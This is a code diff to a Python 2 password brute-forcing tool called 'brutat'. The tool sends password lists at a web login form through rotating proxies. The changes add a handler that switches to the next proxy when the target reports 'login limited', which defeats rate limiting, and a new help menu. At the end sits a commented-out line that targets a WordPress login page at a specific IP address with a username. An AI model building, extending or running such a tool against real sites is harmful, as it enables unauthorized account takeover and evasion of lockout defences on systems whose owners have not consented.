@@ -29,16 +29,17 @@ logo = '''
 
 print colored(logo, 'red')
 
-print '''Syntax: -set -url http://example.com -username admin -passlist wordlist.txt -proxylist proxylist.txt
-Syntax: -run -timeout 1.0 -proxy true
+print '''
+ Syntax:-----------------------------------------------------------------------
+        -createdb                                 [ Create database           ]
+        -----------------------------------------------------------------------
+        -view                                     [ View database record      ]
         -----------------------------------------------------------------------
         -run  [ default timeout 1.0 proxy false ] [ Run brute force           ]
         -run -timeout   [ 2.0 ]                   [ Run with timeout          ]
         -run -proxy   [ true / false ]            [ Active proxy list         ]
         -run -text    [ true / false ]            [ Show login text message   ]
         -run -html    [ true / false ]            [ Show html source code     ]
-        -----------------------------------------------------------------------
-        -view                                     [ View database record      ]
         -----------------------------------------------------------------------
         -set -url                                 [ Set target url            ]
         -set -username                            [ Set username              ]
@@ -49,8 +50,9 @@ Syntax: -run -timeout 1.0 -proxy true
         -set -loginf                              [ Set login failed message  ]
         -set -loginl                              [ Set login limited message ]
         -----------------------------------------------------------------------
+        -help                                     [ Show advanced help message]
         -quit                                     [ Exit brutat               ]
-        ------------------------------------------------------------------'''
+        -----------------------------------------------------------------------'''
 
 
 class main:
@@ -118,7 +120,14 @@ class main:
                         data_in.update_row('', p, '', '', '', '', '', '', '', '', '', '', '', 1)
                         self.refresh_var_row()
                         self.login_failed()
-
+                        
+                        
+                    if data_in.lloginl in cek:
+                        # os.system('clear')
+                        x = self.proxyp + 1
+                        data_in.update_row('', '', x, '', '', '', '', '', '', '', '', '', '', 1)
+                        self.refresh_var_row()
+                        self.login_limited()
 
                     else:
                         specLine = alllines.getline(self.passlist, self.passp).split('\n')
@@ -215,6 +224,52 @@ class main:
             print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
             print start_s.htmltotxt
             print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
+
+
+    def login_limited(self):
+        if self.ptext or self.phtml == 'true':
+            print 'monitor mod'
+        else:
+            os.system('clear')
+
+        start_s.timer()
+        self.time = start_s.time
+        self.refresh_var_row()
+
+        print colored('''
+        +---------------------------------------
+        |      [ X ]login limited
+        +---------------------------------------
+        |  Duration:  |  %s
+        +-------------+-------------------------
+        |  Site       |  %s
+        +-------------+-------------------------
+        |  Proxy      |  %s
+        +-------------+-------------------------
+        |  Proxy list |  %s
+        +-------------+-------------------------
+        |  Pass list  |  %s
+        +-------------+-------------------------
+        |  Pass len   |  %s from %s
+        +-------------+-------------------------
+        |  Proxy len  |  %s from %s
+        +-------------+-------------------------
+        |  Username   |  %s
+        +-------------+-------------------------
+        |  Password   |  %s
+        ''', 'red') % (
+        self.time, self.site, self.proxy, self.proxylist, self.passlist, self.passp, self.passlen, self.proxyp, self.proxylen, self.username, self.specLine)
+
+        if self.phtml == 'true':
+            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF SOURCE CODE ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
+            print start_s.html
+            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF SOURCE CODE ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
+
+        if self.ptext == 'true':
+            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ START OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
+            print start_s.htmltotxt
+            print colored('>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ END OF TEXT ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<', 'green')
+
 
 
     def error_msg(self):
@@ -451,6 +506,33 @@ class main:
         if '-view' in x:
             self.view_records()
             self.cmdline()
+        if '-help' in x:
+            os.system('clear')
+            print '''
+ Syntax:-----------------------------------------------------------------------
+        -createdb                                 [ Create database           ]
+        -----------------------------------------------------------------------
+        -view                                     [ View database record      ]
+        -----------------------------------------------------------------------
+        -run  [ default timeout 1.0 proxy false ] [ Run brute force           ]
+        -run -timeout   [ 2.0 ]                   [ Run with timeout          ]
+        -run -proxy   [ true / false ]            [ Active proxy list         ]
+        -run -text    [ true / false ]            [ Show login text message   ]
+        -run -html    [ true / false ]            [ Show html source code     ]
+        -----------------------------------------------------------------------
+        -set -url                                 [ Set target url            ]
+        -set -username                            [ Set username              ]
+        -set -passlist                            [ Set password list         ]
+        -set -proxylist                           [ Set proxy list            ]
+        -set -userinput                           [ Set username input filed  ]
+        -set -passinput                           [ Set password input filed  ]
+        -set -loginf                              [ Set login failed message  ]
+        -set -loginl                              [ Set login limited message ]
+        -----------------------------------------------------------------------
+        -help                                     [ Show advanced help message]
+        -quit                                     [ Exit brutat               ]
+        -----------------------------------------------------------------------'''
+            self.cmdline()
         if '-quit' in x:
             quit()
         else:
@@ -463,3 +545,14 @@ if __name__ == '__main__':
     main_f = main('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '')
     data_in = mod.data_con('', '', '', '', '', '', '', '', '', '', '', '', '', '')
     main_f.cmdline()
+
+
+
+
+    '''
+    command_line(sys.argv[1:])
+    # mod.create_db()
+    data_in.update_row('http://41.239.100.68/wp/wp-login.php', 1, 1, '', 'el2t', '', '', '', '', 1)
+    data_in.load_record()
+    main('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', use_proxy).run()
+    '''
